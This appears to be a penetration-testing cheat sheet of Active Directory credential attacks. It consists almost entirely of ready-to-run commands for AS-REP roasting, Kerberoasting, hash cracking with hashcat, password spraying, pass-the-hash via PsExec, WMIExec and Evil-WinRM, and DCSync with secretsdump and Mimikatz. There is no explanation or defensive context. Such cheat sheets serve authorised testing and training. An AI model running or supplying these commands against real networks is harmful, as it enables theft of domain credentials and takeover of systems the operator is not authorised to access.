# Credential Attacks

## AS-REP Roasting

### GetNPUsers From User List
    impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -format hashcat -outputfile asrep.hash -dc-ip <TARGET_IP>

### GetNPUsers Authenticated
    impacket-GetNPUsers <DOMAIN>/<USER>:<PASSWORD> -request -format hashcat -outputfile asrep.hash

### Crack AS-REP Hash
    hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt


## Kerberoasting

### GetUserSPNs
    impacket-GetUserSPNs <DOMAIN>/<USER>:<PASSWORD> -request -outputfile kerberoast.hash

### NetExec Kerberoasting
    nxc ldap <TARGET_IP> -u <USER> -p <PASSWORD> -d <DOMAIN> --kerberoasting kerberoast.hash

### Rubeus Kerberoast (Windows)
    .\Rubeus.exe kerberoast /outfile:kerberoast.hash

### Crack Kerberoast Hash
    hashcat -m 13100 kerberoast.hash /usr/share/wordlists/rockyou.txt


## Password Spraying

### NetExec Password Spray
    nxc smb <TARGET_IP> -u <USERS_FILE> -p '<PASSWORD>' -d <DOMAIN> --continue-on-success

### Kerbrute Password Spray
    kerbrute passwordspray -d <DOMAIN> --dc <TARGET_IP> <USERS_FILE> '<PASSWORD>'


## Pass-the-Hash

### NetExec Pass-the-Hash
    nxc smb <TARGET_IP> -u <USER> -H <NTLM_HASH> -d <DOMAIN>

### Impacket PsExec Pass-the-Hash
    impacket-psexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>

### Evil-WinRM Pass-the-Hash
    evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>

### Impacket WMIExec Pass-the-Hash
    impacket-wmiexec <DOMAIN>/<USER>@<TARGET_IP> -hashes :<NTLM_HASH>


## DCSync

### Impacket DCSync
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -just-dc-ntlm

### Impacket DCSync Specific User
    impacket-secretsdump <DOMAIN>/<USER>:<PASSWORD>@<TARGET_IP> -just-dc-user <TARGET_USER>

### Mimikatz DCSync (Windows)
    mimikatz# lsadump::dcsync /domain:<DOMAIN> /user:<TARGET_USER>
